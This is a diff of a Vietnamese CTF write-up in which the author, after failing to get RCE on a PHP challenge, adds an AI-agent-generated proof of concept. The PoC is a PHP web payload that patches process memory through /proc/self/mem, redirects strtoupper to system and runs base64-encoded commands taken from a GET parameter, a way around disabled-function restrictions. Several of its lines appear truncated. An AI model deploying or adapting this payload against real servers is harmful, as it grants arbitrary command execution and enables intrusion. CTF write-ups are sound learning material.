@@ -248,6 +248,31 @@ Mình thử nhiều hàm khác thì chỉ file_get_contents() hoạt động... 
 Nhưng đến Revenge thì đã không còn /flag.txt nên mình bắt buộc phải có RCE thật sự:
 ![[Attachments/Pasted image 20261028212900.png]]
 
-Thế là mình đã slop AI ra script RCE, lúc sau tìm hiểu thì mới hiểu cơ chế của phương pháp này:
-![[Attachments/Pasted image 20261028213259.png]]
+Mình đã thử mọi loại hàm có thể giúp RCE trên đời nhưng không thể nào RCE được 💔 mình nản quá nên quyết định slop bằng AI agent tạo ra một PoC sử dụng kĩ thuật Mem-patch mà mình chỉ hiểu được nguyên lý chứ không hiểu code như thế nào;-;
+Các bạn có thể đọc giải thích của AI agent ở đây nhé [[Slop mem patch with AI agent]]
+
+PoC:
+
+runner_payload.php:
+```php
+$b=0;
+foreach(file('/proc/self/maps') as $l){ if(strpos($l,'libphp.so')!==false && preg_match('/^([0-9a-f]+)-[0-9a-f]+ .... 00000000 /',$l>
+$m=fopen('/proc/self/mem','r+b');
+function rr($a,$n){global $m;fseek($m,$a);$s='';while(strlen($s)<$n){$x=fread($m,$n-strlen($s));if($x===''||$x===false)break;$s.=$x;>
+function uu($a,$n){$s=rr($a,$n);$v=0;for($i=$n-1;$i>=0;$i--)$v=($v<<8)|ord($s[$i]);return $v;}
+function ww($a,$s){global $m;fseek($m,$a);return fwrite($m,$s);}
+function fti($p){$ar=uu($p+16,8);$nu=uu($p+24,4);$ns=uu($p+32,4);if($ar<0x1000||$nu==0||$nu>$ns||$ns>200000)return null;return array>
+function gfn($p,$want){$t=fti($p);if(!$t)return null;list($ar,$nu)=$t;$wl=strlen($want);for($i=0;$i<$nu;$i++){$bk=$ar+$i*32;$k=uu($b>
+$eg=$b+15122944; $ft=uu($eg+432,8); $fp=gfn($ft,'strtoupper'); $sys=$b+3440272;
+if($fp && uu($fp+56,8)!==$sys) ww($fp+56,pack('P',$sys));
+$cmd=base64_decode($_GET['x']);
+echo "__B__\n";
+if($cmd!==''){
+  $o='/tmp/x.out'; @unlink($o);
+  $f=$cmd.' > '.$o.' 2>&1; chmod 644 '.$o;
+  if($fp) strtoupper($f);
+  echo @file_get_contents($o);
+}
+echo "\n__E__\n";
+```
 
